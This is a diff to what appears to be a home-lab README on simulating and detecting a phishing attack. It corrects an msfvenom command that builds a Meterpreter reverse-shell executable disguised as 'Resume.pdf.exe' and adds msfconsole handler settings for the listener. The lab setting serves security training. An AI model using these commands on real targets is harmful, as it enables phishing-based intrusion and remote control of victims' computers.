@@ -84,7 +84,7 @@ Download and configure Sysmon with an XML configuration file for detailed proces
 
 3. **Malware Creation:** Generate a malware executable with `msfvenom` using the `windows/meterpreter/reverse_tcp` payload.
 
-         msfvenom -p windows/x64/meterpreter/reverse_tcp lhost="Your Host IP" lport=4444 -f exe -oResume.pdf.exe
+         msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<Your_IP> lport=4444 -f exe -o Resume.pdf.exe
    ![malware created](./assets/msfresume.png)
 
 4. **Phishing Email:**
@@ -100,17 +100,19 @@ Download and configure Sysmon with an XML configuration file for detailed proces
 
 1. Launch `msfconsole` and configure it to listen for an incoming connection:
    ```bash
+   msfconsole
    use exploit/multi/handler
-   set payload windows/meterpreter/reverse_tcp
-   set LHOST <Your_IP>
-   set LPORT 4444
+   set payload windows/x64/meterpreter/reverse_tcp
+   set lhost <Your_IP>
+   set lport 4444
+   options
    exploit
    ```
-
+![msf consoole](./assets/msfconsole.png)
 ### Step 2: Execute the Malware on Windows 10 (Victim Machine)
 
 - Open the malware attachment from the phishing email on the victim machine to initiate a reverse shell connection.
-
+![malware running](./assets/malware-runing.png)
 ### Step 3: Access the Victim Machine
 
 - Once the malware is executed, access the victim machine via the Meterpreter shell.
